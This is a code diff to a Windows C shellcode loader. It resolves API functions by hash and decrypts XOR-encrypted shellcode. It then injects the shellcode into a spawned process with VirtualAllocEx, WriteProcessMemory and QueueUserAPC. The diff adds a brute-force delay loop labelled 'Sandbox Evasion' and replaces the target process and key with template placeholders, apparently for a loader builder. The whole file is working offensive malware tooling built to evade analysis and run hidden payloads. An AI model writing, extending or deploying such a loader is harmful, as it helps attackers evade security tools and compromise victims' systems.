@@ -29,29 +29,40 @@ Externally defined IAT variables:
 
 */
 
+#include "Hash.h"
+/*
+Externally defined Hash function:
+
+{
+    uint64_t Hash( const char *str, uint64_t seed );
+}
+
+*/
+
+#include <stdint.h>
 #include <stdio.h>
+#include <string.h>
+#include <time.h>
 #include <windows.h>
 
-int main( int argc, char *argv[] ) {
-
-    /*
-
-    CreateProcessA -> 0x215613a9e
-    VirtualAllocEx -> 0x44fc51c32
-    WriteProcessMemory -> 0x593b94aae
-    QueueUserAPC -> 0x45688564c
-    ResumeThread -> 0x24b52292
-    WaitForSingleObject -> 0xd8670435
-    CloseHandle -> 0x2fba412b3
-    VirtualFreeEx -> 0x48238ac7f
-
-    */
-
-    HMODULE hLib = LoadLibraryA( "kernel32.dll" );
-    if ( hLib == NULL ) {
-        printf( "Failed to load kernel32.dll\n" );
-        return 1;
+void incr( char *str ) {
+    int index = 0;
+    while ( str[index] != '\0' ) {
+        if ( str[index] < 'z' ) {
+            str[index]++;
+            break;
+        } else {
+            str[index] = 'a';
+            index++;
+        }
     }
+    if ( str[index] == '\0' && index < 8 ) {
+        str[index] = 'a';
+        str[index + 1] = '\0';
+    }
+}
+
+int main( int argc, char *argv[] ) {
 
     typedef struct {
         BOOL( *CreateProcessA )
@@ -81,8 +92,70 @@ int main( int argc, char *argv[] ) {
 
     } Overwat;
 
-    uint64_t seed = 5;
+    /*
+        CreateProcessA -> 0x215613a9e
+        VirtualAllocEx -> 0x44fc51c32
+        WriteProcessMemory -> 0x593b94aae
+        QueueUserAPC -> 0x45688564c
+        ResumeThread -> 0x24b52292
+        WaitForSingleObject -> 0xd8670435
+        CloseHandle -> 0x2fba412b3
+        VirtualFreeEx -> 0x48238ac7f
+        zzazzl -> 0x40ba6a2ed
+    */
 
+    /* Sandbox Evasion */
+    printf( "[*] Beginning bruteforce routine... \n" );
+
+    const uint64_t test = 0x40ba6a2ed;
+
+    const uint64_t seed = 5;
+    const int timeout = 40;
+
+    char attempt[9] = "a";
+
+    time_t start_time, current_time;
+    time( &start_time );
+
+    while ( strlen( attempt ) <= 8 ) {
+        uint64_t attempt_hash = Hash( attempt, seed );
+
+        if ( attempt_hash == test ) {
+            printf( "OK -> %s\n", attempt );
+
+            int elapsed_time = difftime( current_time, start_time );
+            printf( "[!!!] Elapsed time: %d seconds\n", elapsed_time );
+            printf( " [+] Beginning execution now. :) " );
+            break;
+        }
+        incr( attempt );
+
+        time( &current_time );
+        if ( difftime( current_time, start_time ) > timeout ) {
+            printf( "Timeout reached, for some reason it wasn't cracked lol\n" );
+            char user_input[10];
+            printf( "Enter the correct plaintext (up to 10 characters): " );
+            scanf_s( "%10s", user_input, (unsigned)_countof( user_input ) );
+
+            if ( Hash( user_input, seed ) == test ) {
+                printf( "OK -> %s\n", user_input );
+                break;
+            } else {
+                printf( "Incorrect.\n" );
+                return 1;
+            }
+
+            return 0;
+        }
+    }
+
+    /* Resolving WinAPI Functions */
+
+    HMODULE hLib = LoadLibraryA( "kernel32.dll" );
+    if ( hLib == NULL ) {
+        printf( "Failed to load kernel32.dll\n" );
+        return 1;
+    }
     uint64_t hashes[] = {
         0x215613a9e, 0x44fc51c32, 0x593b94aae, 0x45688564c, 0x24b52292, 0xd8670435, 0x2fba412b3, 0x48238ac7f };
 
@@ -147,11 +220,14 @@ int main( int argc, char *argv[] ) {
     FreeLibrary( hLib );
 
     printf( "[+] Successfully resolved %zu hashes\n", sizeof( hashes ) / sizeof( hashes[0] ) );
+
+    /* Begin execution now. */
+
     printf( "[!!!] Beginning loader routine now. \n\n" );
 
     STARTUPINFO si = { sizeof( si ) };
     PROCESS_INFORMATION pi = { 0 };
-    LPCSTR target = "C:\\Windows\\System32\\cmd.exe";
+    LPCSTR target = "${ PNAME }";
 
     printf( "[-] Tasked to spawn: %s\n", target );
 
@@ -174,7 +250,7 @@ int main( int argc, char *argv[] ) {
 
     printf( "[-] Beginning decryption routine" );
 
-    xorShellcode( shellcode, shellcode_size, "mySecretKey1234" );
+    xorShellcode( shellcode, shellcode_size, "${ KEY }" );
 
     printf( "[+] Shellcode decryption complete.\n" );
 
@@ -186,7 +262,7 @@ int main( int argc, char *argv[] ) {
         w.CloseHandle( pi.hThread );
         return 1;
     }
-    printf( "[+] OK: Wwrote %zu bytes to %p.\n", shellcode_size, lpBaseAddress );
+    printf( "[+] OK: Wrote %zu bytes to %p.\n", shellcode_size, lpBaseAddress );
 
     printf( "[+] Queuing APC to the target thread...\n" );
     if ( !w.QueueUserAPC( (PAPCFUNC)lpBaseAddress, pi.hThread, NULL ) ) {
